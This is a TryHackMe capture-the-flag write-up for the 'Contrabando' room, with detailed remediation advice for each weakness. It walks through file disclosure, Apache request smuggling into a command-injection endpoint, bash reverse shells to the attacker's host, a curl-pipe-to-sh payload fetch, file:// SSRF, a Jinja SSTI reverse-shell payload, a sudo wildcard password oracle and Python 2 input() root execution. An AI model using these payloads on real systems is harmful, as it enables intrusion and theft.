# Contrabando Challenge

![Banner](./../IMAGES/contrabando_img.png?raw=true)

**Category:** *Standalone Challenge* | **Section:** *TryHackMe Challenges* | **Challenge:** *[Contrabando](https://tryhackme.com/room/contrabando)*

> [!IMPORTANT]
>
> **Working writeup notice:** This was a working and verified writeup at the time of writing on **29 July 2026**.
>
> **Slogan:** *Never tell me the odds.*
>
> **Spoiler warning:** This writeup documents the complete exploitation and privilege-escalation chain. Credentials, exact challenge-specific values, internal identifiers, recovered passwords and flag codes have been redacted.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The assessment was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, internal addresses, exact exploit values, passwords, container identifiers or other direct challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This writeup was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation, container security and defensive security.

## Lab Summary

Contrabando begins with a web application exposed through Apache. Initial enumeration reveals only SSH and HTTP, but the web application contains a file-reading weakness that exposes source code.

The disclosed source leads to a command-injection vulnerability in a hidden password generator. That endpoint cannot be reached directly from the public-facing application, so an HTTP request-smuggling technique is used to send a backend POST request and obtain a reverse shell inside a Docker container.

The container can communicate with an internal Flask application running on the Docker host. That application accepts a URL, fetches its contents with PycURL and renders the fetched data through `render_template_string()`. This produces two further weaknesses:

1. `file://` server-side request forgery allows local files to be read from the host.
2. Jinja server-side template injection allows commands to execute as the Flask service account.

A shell is obtained as the local user, and the first flag is collected. Privilege escalation then relies on two unsafe sudo-controlled scripts:

- A Bash vault script compares a root-owned password against unquoted user input, allowing wildcard-based password recovery.
- A Python password generator is permitted through `sudo` with Python 2, where `input()` evaluates attacker-controlled Python expressions.

The successful attack chain involved:

1. Confirming the target, VPN route, `tun0` address and local hostname mapping.
2. Enumerating SSH and Apache HTTP.
3. Discovering the `/page/` application route and exposed CGI endpoints.
4. Confirming arbitrary file disclosure through double URL encoding.
5. Reading the source of the hidden password generator.
6. Identifying command injection in the POST `length` parameter.
7. Using Apache request smuggling to reach the hidden backend endpoint.
8. Obtaining a reverse shell as `www-data` inside a Docker container.
9. Identifying the Docker gateway through `/proc/net/route`.
10. Reaching an internal Flask application.
11. Using `file://` SSRF to read host files.
12. Reading the Flask source code.
13. Exploiting Jinja SSTI to obtain a shell as the local user.
14. Reading the first flag as `THM{....}`.
15. Enumerating sudo permissions.
16. Recovering the local user's password through a wildcard comparison flaw.
17. Logging in through SSH for a stable terminal.
18. Exploiting Python 2 `input()` through a permitted sudo command.
19. Reading the second flag as `THM{....}`.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: contrabando.thm
```

The mapping was confirmed with:

```bash
getent hosts contrabando.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using your own Kali Linux VM, `/etc/hosts` is especially important during TryHackMe challenges. Some rooms rely on hostname-based routing, redirects, virtual hosts, certificates, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries left behind by previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti - technically functional, but increasingly difficult to trust.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old Contrabando entry can be removed with:

```bash
sudo sed -i '/contrabando\.thm/d' /etc/hosts
```

The currently allocated target can then be added again using `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip`, `getent` and `ping` for VPN routing, hostname resolution and connectivity checks.
- Nmap and RustScan for TCP port discovery, service detection and default script enumeration.
- WhatWeb for identifying web technologies.
- Dirsearch, Gobuster, FFUF and Feroxbuster for web content discovery.
- cURL for manual HTTP testing, file disclosure, SSRF and exploit delivery.
- Python's built-in HTTP server for hosting reverse-shell and SSTI payloads.
- Netcat for receiving reverse shells.
- Standard Linux utilities including `cat`, `ls`, `find`, `printf`, `grep`, `file` and shell loops.
- `/proc/net/route` for identifying the Docker gateway where the `ip` command was unavailable.
- OpenSSH for establishing a stable session as the compromised local user.
- Bash wildcard matching for recovering a protected password through an unsafe comparison.
- Python 2 unsafe `input()` evaluation for root-level command execution.

Click [HERE](https://github.com/Valikahn/TryHackMe-Standalone-Challenge#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

A full TCP scan was performed:

```bash
nmap -Pn -n -p- --min-rate 5000 -T4 contrabando.thm
```

The result showed two externally reachable services:

```text
22/tcp open  ssh
80/tcp open  http
```

RustScan was used to confirm the open ports and run Nmap's default scripts and service detection:

```bash
rustscan -a contrabando.thm --ulimit 5000 -- -sC -sV -Pn
```

The most relevant HTTP findings were:

```text
80/tcp open  http
Apache/2.4.55 (Unix)
Supported methods: GET HEAD POST OPTIONS
```

SSH was not initially useful because no credentials had been recovered. The investigation therefore focused on Apache.

### Web Technology Identification

WhatWeb identified the public application as an Apache-hosted HTML site:

```bash
whatweb -a 1 contrabando.thm/
```

The result included:

```text
Apache/2.4.55
HTML5
Unix
```

### Web Content Discovery

Several tools were used to cross-check the exposed web content.

Dirsearch identified two CGI endpoints:

```bash
dirsearch -u contrabando.thm/
```

Relevant results:

```text
/cgi-bin/printenv
/cgi-bin/test-cgi
```

Gobuster was also run:

```bash
gobuster dir \
  -u http://contrabando.thm/ \
  -w /usr/share/wordlists/dirb/big.txt
```

FFUF confirmed the public index file:

```bash
ffuf \
  -u 'http://contrabando.thm/FUZZ' \
  -w /usr/share/wordlists/dirb/big.txt \
  -mc all \
  -t 100 \
  -ic \
  -fc 404 \
  -e .php,.txt,.html,.py
```

Feroxbuster provided the most useful recursive results:

```bash
feroxbuster \
  -u http://contrabando.thm/ \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,txt,html,py \
  -t 50 \
  -k \
  -C 404 \
  --redirects
```

Notable routes included:

```text
/page/home.html
/page/index.php
/page/
```

The large number of unusual results under `/page/` suggested that the route was passing attacker-controlled path data to a backend file-reading function.

### Misleading Backup-File Test

An early test requested a possible backup file:

```bash
curl -i http://contrabando.thm/page/home.html.bak
```

The application returned:

```text
Warning: readfile(home.html.bak): failed to open stream:
No such file or directory in /var/www/html/index.php on line 5
```

The file did not exist, but the error message was valuable. It disclosed that the application used PHP's `readfile()` function with user-controlled input.

## Exploits

### Arbitrary File Disclosure

The `/page/` route accepted an encoded file path. A single encoded slash was processed by the front-end layer, so the path had to be double URL encoded.

The host password file was requested with:

```bash
curl -s 'http://contrabando.thm/page/%252Fetc%252Fpasswd'
```

`%252F` represents a double-encoded `/`:

```text
%25 = encoded percent sign
%2F = encoded forward slash
%252F -> first decoding pass -> %2F -> second interpretation -> /
```

The response returned the container's `/etc/passwd` file. Only standard system and web-service accounts were present, supporting the conclusion that the application was running inside a minimal container.

### Password Generator Source Disclosure

The vulnerable file reader was used to retrieve the source of `gen.php`:

```bash
curl -s http://contrabando.thm/page/gen.php
```

The important logic was:

```php
function generateRandomPassword($length) {
    $password = exec("tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c " . $length);
    return $password;
}

if(isset($_POST['length'])){
    $length = $_POST['length'];
    $randomPassword = generateRandomPassword($length);
    echo $randomPassword;
}
```

The POST parameter `length` was concatenated directly into a shell command passed to `exec()`. This created an OS command-injection vulnerability.

### Direct Endpoint Failure

A direct POST request to `/gen.php` returned `404 Not Found`:

```bash
curl -s -X POST \
  'http://contrabando.thm/gen.php' \
  --data-urlencode 'length=8; id'
```

This showed that the source file could be read through `/page/`, but the backend endpoint was not directly exposed through the public Apache routing.

### Apache Request Smuggling

The public Apache configuration could be manipulated by inserting encoded carriage-return and line-feed sequences into the requested path. This allowed a second HTTP request to be interpreted by the backend.

A harmless proof-of-concept initially attempted to smuggle a POST request that executed `id`. The visible response only contained:

```text
Warning: readfile(test): failed to open stream
```

That output belonged to the first request and did not prove that the backend request had failed. A callback-based test was therefore used instead.

### Preparing the Reverse-Shell Payload

The initial payload used Bash TCP redirection:

```bash
printf '%s\n' \
  'bash -i >& /dev/tcp/<TUN0_IP>/<REDACTED> 0>&1' \
  > /tmp/VK/index.html
```

The target successfully downloaded the file, but no reverse shell arrived because the downloaded payload was executed by `sh`. The `/dev/tcp` redirection syntax is a Bash feature and is not supported by every `/bin/sh` implementation.

The payload was corrected to invoke Bash explicitly:

```bash
printf '%s\n' \
  'bash -c "bash -i >& /dev/tcp/<TUN0_IP>/<REDACTED> 0>&1"' \
  > /tmp/VK/index.html
```

A local HTTP server was started:

```bash
cd /tmp/VK/ && python3 -m http.server 8000
```

A listener was started in a separate terminal:

```bash
nc -lvnp <REDACTED>
```

### Smuggled Command Injection

The crafted request contained a public request followed by a smuggled backend POST request. The exact request body and callback port are partially redacted:

```bash
curl --path-as-is -s \
  'http://contrabando.thm/page/gen.php%20HTTP/1.1%0D%0AHost:%20contrabando.thm%0D%0A%0D%0APOST%20/gen.php%20HTTP/1.1%0D%0AHost:%20localhost%0D%0AContent-Length:%20<REDACTED>%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Alength=1;curl%20<TUN0_IP>:8000|sh;%0D%0A%0D%0A%0D%0A'
```

`--path-as-is` prevented cURL from normalising the encoded path.

The Kali HTTP server logged:

```text
<TARGET_IP> - - "GET / HTTP/1.1" 200 -
```

The Netcat listener received a shell:

```text
connect to [<TUN0_IP>] from (UNKNOWN) [<TARGET_IP>] <REDACTED>
www-data@<REDACTED>:/var/www/html$
```

The shell context was confirmed:

```bash
id
whoami
pwd
ls
```

The effective result was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
/var/www/html
gen.php
home.html
index.php
sky.jpeg
```

This established command execution as `www-data` inside the web container.

### Container Enumeration

A search for likely flag files returned only unrelated system files:

```bash
find / -type f \( -iname '*flag*' -o -iname 'user.txt' \) 2>/dev/null
```

The `ip` utility was not installed:

```text
bash: ip: command not found
```

The kernel routing table was therefore inspected directly:

```bash
cat /proc/net/route
```

The default route contained the gateway value:

```text
010012AC
```

This value was stored in little-endian hexadecimal. It was decoded by reversing the byte order:

```text
01 00 12 AC
AC 12 00 01
```

Each hexadecimal byte was then converted to decimal:

```text
AC = 172
12 = 18
00 = 0
01 = 1
```

The resulting Docker gateway was:

```text
<REDACTED>
```

The exact internal address is intentionally redacted because it is a direct challenge-specific pivot value.

### Internal Flask Application

An HTTP request was sent from the container to the internal Docker host:

```bash
curl -s http://<REDACTED>:5000/
```

The application returned a form titled:

```text
Fetch Website Content
Currently in Development
```

The form accepted a `website_url` POST parameter.

### SSRF Through the file:// Scheme

The internal application was tested with a local file URL:

```bash
curl -s \
  -d 'website_url=file:///etc/passwd' \
  http://<REDACTED>:5000/
```

The host's `/etc/passwd` file was returned inside the HTML response. It contained a local user whose account name is intentionally redacted:

```text
<REDACTED>:x:1000:1000::/home/<REDACTED>:/bin/bash
```

This confirmed server-side request forgery with access to the `file://` scheme.

### Incorrect Flag Filename

An initial attempt requested a conventional user flag filename:

```bash
curl -s \
  -d 'website_url=file:///home/<REDACTED>/user.txt' \
  http://<REDACTED>:5000/
```

The server returned:

```text
500 Internal Server Error
```

The filename was incorrect. Rather than continuing to guess filenames, the Flask application source was inspected.

### Flask Source Disclosure

The source was retrieved through the same `file://` SSRF:

```bash
curl -s \
  -d 'website_url=file:///home/<REDACTED>/app/app.py' \
  http://<REDACTED>:5000/
```

The important code was:

```python
from flask import Flask, render_template, render_template_string, request
import pycurl
from io import BytesIO

website_url = request.form['website_url']

buffer = BytesIO()
c = pycurl.Curl()
c.setopt(c.URL, website_url)
c.setopt(c.WRITEDATA, buffer)
c.perform()

content = buffer.getvalue().decode('utf-8')

website_content = '''
...
<div>
    %s
</div>
...
''' % content

return render_template_string(website_content)
```

The fetched content was inserted directly into a string that was then processed by `render_template_string()`. Any Jinja syntax inside the fetched resource was therefore evaluated by Flask.

### Jinja Server-Side Template Injection

A malicious template was created on Kali. The exact callback port is redacted:

```bash
printf '%s\n' \
  "{{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/<TUN0_IP>/<REDACTED> 0>&1\"').read() }}" \
  > /tmp/VK/ssti.txt
```

A second HTTP server hosted the payload:

```bash
cd /tmp/VK/ && python3 -m http.server 8001
```

A Netcat listener was opened:

```bash
nc -lvnp <REDACTED>
```

The existing `www-data` shell instructed the Flask application to fetch the malicious template:

```bash
curl -s \
  -d 'website_url=http://<TUN0_IP>:8001/ssti.txt' \
  http://<REDACTED>:5000/
```

The HTTP server recorded a successful request for `ssti.txt`, and the listener received a new shell:

```text
<REDACTED>@contrabando:~$
```

The shell was running as the local user identified in `/etc/passwd`.

### First Flag

The user's home directory was listed:

```bash
ls
```

The first flag file used a challenge-specific name:

```text
<REDACTED>_userflag.txt
```

The file was read:

```bash
cat <REDACTED>_userflag.txt
```

The first answer was:

```text
THM{....}
```

This was the first flag discovered during the assessment.

### Sudo Enumeration

The local user's sudo permissions were inspected:

```bash
sudo -l
```

The relevant rules were:

```text
(root) NOPASSWD: /usr/bin/bash /usr/bin/vault
(root) /usr/bin/python* /opt/generator/app.py
```

The first rule allowed the root-owned vault script to run without a password. The second allowed Python interpreters matching `/usr/bin/python*` to execute `/opt/generator/app.py` as root, but required the user's password.

### Vault Script Review

The vault file type was checked:

```bash
file /usr/bin/vault
```

Result:

```text
Bourne-Again shell script, ASCII text executable
```

The script was then inspected:

```bash
cat /usr/bin/vault
```

Relevant logic:

```bash
content=$(/usr/bin/cat "$file_to_check")
read -s -p "Enter the required input: " user_input

if [[ $content == $user_input ]]; then
    /usr/bin/cat "$file_to_print"
else
    /usr/bin/echo "Password does not match!"
fi
```

The root-controlled paths were:

```text
file_to_check="/root/password"
file_to_print="/root/secrets"
```

The variable on the right side of the Bash comparison was unquoted. Inside `[[ ... ]]`, this allowed the supplied value to be interpreted as a wildcard pattern.

### Wildcard Authentication Bypass

The script was executed as root:

```bash
sudo /usr/bin/bash /usr/bin/vault
```

Entering:

```text
*
```

returned:

```text
Password matched!
```

The file `/root/secrets` contained Star Wars trivia rather than the final flag. It was a decoy, but the wildcard behaviour provided a password oracle.

### Recovering the Password Character by Character

A pattern such as `a*` tested whether the protected password began with `a`:

```bash
printf 'a*\n' | sudo /usr/bin/bash /usr/bin/vault
```

The first character was identified by looping over letters and digits:

```bash
for c in {a..z} {A..Z} {0..9}; do
  printf '%s\n' "${c}*" |
    sudo /usr/bin/bash /usr/bin/vault 2>/dev/null |
    grep -q 'Password matched' &&
    echo "First character: $c" &&
    break
done
```

The password was then recovered one character at a time by extending the known prefix and testing each possible next character.

> [!WARNING]
>
> The wildcard character `*` must not be included as a candidate character in the recovery set. When it was accidentally included, every later test matched and the loop began appending unlimited asterisks.

The recovered password is intentionally shown as:

```text
<REDACTED>
```

The exact value was verified without a wildcard:

```bash
printf '<REDACTED>\n' |
  sudo /usr/bin/bash /usr/bin/vault
```

The result confirmed:

```text
Password matched!
```

### Stable SSH Session

The recovered password allowed a stable SSH login:

```bash
ssh <REDACTED>@contrabando.thm
```

The SSH session avoided the terminal limitations encountered with the earlier reverse shell and allowed `sudo` to prompt normally.

### Python Generator Review

The root-owned script was inspected:

```bash
ls -l /opt/generator/app.py
cat /opt/generator/app.py
```

Relevant code:

```python
import random
import string

def generate_password(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    random.seed()
    secret = input("Any words you want to add to the password? ")
    password_characters = list(characters + secret)
    random.shuffle(password_characters)
    password = ''.join(password_characters[:length])
    return password
```

The script attempted to support both Python 2 and Python 3:

```python
try:
    length = int(raw_input("Enter the desired length of the password: "))
except NameError:
    length = int(input("Enter the desired length of the password: "))
```

Under Python 2:

- `raw_input()` returns a string.
- `input()` evaluates the supplied text as a Python expression.

Because the sudo rule permitted `/usr/bin/python*`, the script could be deliberately launched with Python 2.

### Root Command Execution Through Python 2 input()

The script was executed as root:

```bash
sudo /usr/bin/python2 /opt/generator/app.py
```

The legitimate sudo password was entered, followed by a normal numeric length:

```text
Enter the desired length of the password: 12
```

At the second prompt, a Python expression was supplied:

```python
__import__("os").system("ls -la /root")
```

This executed as root and disclosed:

```text
/root/root.txt
```

The script then raised:

```text
TypeError: cannot concatenate 'str' and 'int' objects
```

The error was harmless. `os.system()` returns an integer exit status, so the later attempt to concatenate it with a string failed only after the injected command had already run.

### Second Flag

The exploit was repeated with:

```python
__import__("os").system("cat /root/root.txt")
```

The second answer was:

```text
THM{....}
```

This was the second flag discovered and completed the challenge.

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The target and `tun0` addresses were confirmed before scanning. The hostname `contrabando.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`, and routing was verified through the TryHackMe VPN.

### 2. External Service Discovery
Nmap and RustScan identified SSH on port 22 and Apache HTTP on port 80. With no initial credentials, the web service became the primary target.

### 3. Web Content Enumeration
WhatWeb identified Apache on Unix. Dirsearch, Gobuster, FFUF and Feroxbuster found CGI endpoints and the important `/page/` route.

### 4. File-Read Error Disclosure
A nonexistent backup-file request triggered a PHP warning that exposed the use of `readfile()` in `/var/www/html/index.php`.

### 5. Double-Encoded File Disclosure
A double URL-encoded path was used to retrieve `/etc/passwd`, confirming arbitrary file disclosure inside a container.

### 6. Source-Code Recovery
The source of `gen.php` was read. Its `length` parameter was concatenated into an `exec()` shell command without validation.

### 7. Hidden Endpoint Limitation
A direct request to `/gen.php` returned `404 Not Found`, showing that the command-injection endpoint was reachable only behind the front-end routing.

### 8. Apache Request Smuggling
Encoded CRLF sequences were placed into the request path to make the backend interpret a second POST request.

### 9. Command Injection and Container Shell
The smuggled POST injected a cURL command into the password generator. The target downloaded a Bash reverse-shell payload from Kali and connected back as `www-data`.

### 10. Docker Network Discovery
The container lacked the `ip` command, so `/proc/net/route` was inspected. The gateway value `010012AC` was decoded from little-endian hexadecimal by reversing the bytes and converting each byte to decimal. The resulting internal address is redacted as `<REDACTED>`.

### 11. Internal Flask Service
The container reached a Flask application on the Docker host. The application accepted a user-controlled URL and fetched its contents with PycURL.

### 12. file:// SSRF
Submitting `file:///etc/passwd` caused the Flask process to return the host password file, revealing a local user.

### 13. Flask Source Disclosure
The Flask source was read through the SSRF. It inserted fetched content into a string and passed the result to `render_template_string()`.

### 14. Jinja SSTI
A malicious Jinja template was hosted from Kali and fetched by the internal application. Rendering the template executed a reverse-shell command as the Flask service user.

### 15. First Flag
The resulting local-user shell was used to read the first flag:

```text
THM{....}
```

### 16. Sudo Enumeration
`sudo -l` revealed a passwordless Bash vault script and a password-protected Python generator rule.

### 17. Vault Wildcard Oracle
The vault script compared a root-owned password against unquoted user input. Bash wildcard patterns could therefore test password prefixes.

### 18. Password Recovery
The password was recovered one character at a time with prefix patterns. The value is intentionally redacted:

```text
<REDACTED>
```

### 19. SSH Access
The recovered credential was used to establish a stable SSH session as the local user.

### 20. Python 2 Code Execution
The root-owned generator was run through the permitted Python 2 interpreter. Its unsafe `input()` call evaluated an attacker-controlled Python expression.

### 21. Second Flag
Root-level command execution was used to read:

```text
/root/root.txt
```

The final answer was:

```text
THM{....}
```

## Key Lessons

Contrabando demonstrated several useful penetration-testing and defensive-security lessons:

- Confirm VPN routing and hostname resolution before troubleshooting higher-level application behaviour.
- Keep `/etc/hosts` tidy when using a personal Kali Linux VM for TryHackMe rooms.
- Error messages can disclose implementation details such as source paths, function names and backend architecture.
- Double URL encoding can bypass front-end path handling when multiple decoding layers are involved.
- Source disclosure can be as serious as direct code execution because it exposes hidden endpoints and unsafe logic.
- A direct `404` does not prove that an endpoint is unreachable from every internal routing layer.
- HTTP request smuggling can bridge a public front-end and a hidden backend endpoint.
- `Content-Length` must match the smuggled request body exactly.
- cURL's `--path-as-is` option is important when testing encoded path manipulation.
- Reverse-shell syntax depends on the interpreter. Bash-specific `/dev/tcp` redirection may fail under `/bin/sh`.
- A shell prompt containing a random-looking hostname can indicate containerisation.
- Minimal containers may lack standard networking tools, but procfs can still expose route information.
- Little-endian hexadecimal route values must be byte-reversed before conversion to dotted-decimal notation.
- Internal-only services should not be assumed safe merely because they are not externally exposed.
- PycURL and similar URL-fetching libraries must restrict allowed schemes.
- `file://` SSRF can turn a web fetcher into a local file reader.
- Fetched remote content remains untrusted data and must never be rendered as a template.
- `render_template_string()` is dangerous when template text contains attacker-controlled content.
- A Bash comparison inside `[[ ... ]]` can perform wildcard matching when user-controlled patterns are not treated literally.
- Password-verification scripts can become character-by-character disclosure oracles.
- Wildcard characters must be handled carefully when scripting an oracle attack.
- Python 2 `input()` evaluates code and should never process untrusted input.
- Broad sudo rules such as `/usr/bin/python*` can allow an attacker to select an unsafe interpreter.
- Stable SSH access is often preferable to continuing privilege escalation through an unreliable reverse shell.

The most important lesson was that the compromise depended on several trust boundaries failing in sequence. A public file reader exposed a hidden command-injection endpoint, request smuggling reached it, a container could access an unsafe internal service, fetched data became a Jinja template, and weak sudo-controlled scripts finally exposed root access.

## Remediation Notes

### Hostname and Operational Hygiene

- Keep `/etc/hosts` limited to mappings required for the active challenge or assessment.
- Remove stale entries after each lab.
- Record the target IP, hostname and `tun0` address before beginning enumeration.
- Use separate working directories for scans, payloads and collected evidence.
- Redact live credentials, internal addresses and flags before publishing notes.

### Apache Request Smuggling

- Ensure all front-end and backend HTTP components parse request boundaries consistently.
- Patch Apache and related proxy components promptly.
- Reject request paths containing encoded carriage returns or line feeds.
- Normalise and validate the request target before proxying.
- Avoid forwarding ambiguous requests containing conflicting lengths or malformed syntax.
- Add logging and alerting for encoded CRLF sequences and unusual request lines.
- Where possible, use HTTP/2 end to end or terminate and regenerate requests safely at a trusted boundary.

### File-Read and Path Handling

- Do not pass user-controlled input directly to `readfile()`.
- Use an allowlist of permitted filenames or document identifiers.
- Resolve the requested path with `realpath()` and confirm it remains inside an approved directory.
- Reject absolute paths, traversal sequences, encoded separators and null bytes.
- Apply one canonical decoding pass and reject repeatedly encoded input.
- Return generic errors without exposing filesystem paths, source filenames or line numbers.

### Command Injection

- Never concatenate untrusted values into shell commands.
- Replace shell pipelines with native language functions.
- Validate the password length as a bounded integer.
- If a command must be executed, pass arguments through a safe process API without invoking a shell.
- Run the web service with a restricted account and minimal filesystem permissions.
- Monitor child-process creation from web-server processes.

### SSRF and URL Fetching

- Allow only required URL schemes such as `https`.
- Explicitly reject `file://`, `gopher://`, `dict://`, local sockets and other non-HTTP schemes.
- Block loopback, link-local, private and internal network ranges after DNS resolution.
- Re-check redirects so an allowed public URL cannot redirect to an internal address.
- Use an outbound proxy with strict destination policy.
- Apply connection timeouts, response-size limits and content-type validation.
- Log outbound destinations requested by users.

### Flask and Jinja Template Security

- Never insert fetched or user-controlled content into `render_template_string()`.
- Render a static template and pass remote content as a normal escaped variable.
- Keep Jinja autoescaping enabled.
- Treat fetched data as untrusted even when it comes from an internal service.
- Avoid exposing application source files through web-accessible or SSRF-reachable paths.
- Run the Flask service with the least privileges required.
- Disable unnecessary outbound connectivity from the application account.

### Container and Network Segmentation

- Do not rely on container network placement as the only access control.
- Apply firewall rules between containers and host services.
- Bind internal services only to required interfaces.
- Use authentication for internal administrative or development services.
- Remove unnecessary routes from web-facing containers to host management networks.
- Apply seccomp, AppArmor or SELinux profiles where supported.
- Use read-only filesystems and drop unnecessary Linux capabilities.

### Vault Script and Secret Comparison

- Do not compare secrets using shell wildcard semantics.
- Quote variables and avoid user-controlled pattern matching.
- Prefer a purpose-built authentication mechanism rather than a custom Bash script.
- Store password hashes rather than plaintext passwords.
- Use constant-time comparison where relevant.
- Rate-limit failed verification attempts.
- Do not expose a yes-or-no password oracle that can be queried repeatedly.
- Remove decoy secret files that encourage unsafe operational practices rather than improving security.

### Sudo Configuration

- Avoid broad wildcard rules such as `/usr/bin/python*`.
- Permit only an exact binary and exact arguments where unavoidable.
- Do not allow users to run interpreters, shells or editors as root.
- Review sudoers entries for argument injection and interpreter selection.
- Require strong authentication and log all privileged command execution.
- Use dedicated, narrowly scoped helper binaries instead of general-purpose scripting runtimes.

### Python 2 and Unsafe input()

- Remove Python 2 from production systems.
- Replace Python 2 `input()` with `raw_input()` where legacy code cannot yet be removed.
- Prefer Python 3 and parse user input explicitly.
- Validate numeric values before use.
- Never evaluate user-supplied expressions with `eval()`, `exec()` or equivalent behaviour.
- Run code under a dedicated unprivileged service account.
- Add tests that verify user input is treated only as data.

### Credential and Secret Storage

- Do not store plaintext credentials in root-owned text files.
- Use an approved secrets-management system.
- Rotate credentials when exposure is suspected.
- Prevent credential reuse between interactive accounts and application services.
- Apply restrictive permissions and access auditing to sensitive files.
- Remove secrets from scripts, backups, logs and shell history.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
